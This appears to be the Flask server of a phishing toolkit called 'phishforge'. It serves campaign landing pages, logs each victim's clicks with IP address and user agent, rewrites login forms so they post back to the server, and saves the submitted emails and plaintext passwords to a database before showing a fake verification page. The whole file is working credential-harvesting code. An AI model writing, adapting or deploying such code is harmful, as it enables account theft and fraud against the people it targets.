from flask import Flask, request, render_template
from datetime import datetime
from phishforge.models.database import *

init_db()

app = Flask(__name__, template_folder='/app/templates')

@app.route('/')
def index():
    """Landing page service - campaign pages at /c/<id>"""
    return render_template('landing_home.html')

@app.route('/c/<int:campaign_id>')
def campaign_landing(campaign_id):
    victim_id = request.args.get('vid')
    if victim_id:
        try:
            victim = get_victim_by_id(int(victim_id))
            if victim and victim['campaign_id'] == campaign_id:
                ip_address = request.remote_addr
                user_agent = request.headers.get('User-Agent', '')
                log_click(victim['id'], campaign_id, ip_address, user_agent)
                print(f"🎣 CLICK TRACKED: {victim['email']} (ID: {victim_id}) from {ip_address}")
        except Exception as e:
            print(f"❌ Invalid victim ID: {victim_id} - {e}")

    campaign = get_campaign(campaign_id)
    if not campaign:
        return "Campaign not found", 404
    
    landing_html = campaign['landing_page_html']

    landing_html = landing_html.replace(
        'action="/login"',
        f'action="/c/{campaign_id}/login"'
    )
    landing_html = landing_html.replace(
        '</form>',
        f'<input type="hidden" name="campaign_id" value="{campaign_id}"></form>'
    )
    return landing_html, 200

@app.route('/c/<int:campaign_id>/login', methods=['POST'])
def campaign_login(campaign_id):
    campaign = get_campaign(campaign_id)
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # Save credentials to hits table
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('INSERT INTO hits (campaign_id, email, password, ip_address) VALUES (?, ?, ?, ?)',
              (campaign_id, email, password, request.remote_addr))
    conn.commit()
    conn.close()
    
    return render_template('verifying.html')

@app.route('/login', methods=['POST'])
def legacy_login():
    """Fallback for forms with action="/login" """
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    # Save to hits (campaign_id = 1 as default)
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''INSERT INTO hits (campaign_id, email, password, ip_address, user_agent) 
                 VALUES (?, ?, ?, ?, ?)''', (1, email, password, ip, user_agent))
    conn.commit()
    conn.close()
    
    print(f"✅ CAPTURED: {email} / {password} from {ip}")
    return render_template('success.html')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=3000)